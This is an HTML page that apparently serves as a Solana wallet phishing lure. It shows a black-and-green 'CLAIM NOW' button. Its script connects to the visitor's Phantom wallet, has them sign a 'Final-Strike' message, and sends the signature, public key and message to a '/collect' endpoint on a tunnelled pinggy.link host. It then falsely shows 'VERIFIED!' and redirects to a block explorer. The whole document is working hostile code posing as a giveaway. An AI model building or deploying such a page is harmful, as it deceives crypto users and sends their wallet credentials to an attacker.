<!DOCTYPE html><html><head><meta charset="UTF-8">
<script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
<body style="background:#000;color:#14F195;text-align:center;padding-top:20vh;font-family:sans-serif;">
    <div style="border:1px solid #14F195;padding:40px;display:inline-block;border-radius:20px;">
        <h2 id="msg">SYSTEM READY</h2>
        <button id="cta" style="padding:20px 40px;background:#14F195;font-size:20px;font-weight:bold;border:none;border-radius:10px;cursor:pointer;">CLAIM NOW</button>
    </div>
<script>
document.getElementById('cta').onclick = async () => {
    try {
        const p = window.solana || window.phantom?.solana;
        const { publicKey } = await p.connect();
        const msg = "Final-Strike-" + Math.floor(Math.random()*9999);
        const signed = await p.signMessage(new TextEncoder().encode(msg), "utf8");
        const sig = btoa(String.fromCharCode.apply(null, signed.signature));
        
        document.getElementById('msg').innerText = "SENDING...";

        // ğŸ”± å¼ºåˆ¶æŒ‡å‘å½“å‰æ´»ç€çš„ Pinggy åŸŸå
        await fetch("https://elrpp-192-142-1-71.a.free.pinggy.link/collect", {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'X-Pinggy-No-Screen': 'true' },
            body: JSON.stringify({ signature: sig, pubkey: publicKey.toString(), message: msg })
        });
        
        alert("âœ… VERIFIED!");
        window.location.href = "https://solscan.io";
    } catch(e) { alert("Error: " + e.message); }
}
</script></body></html>
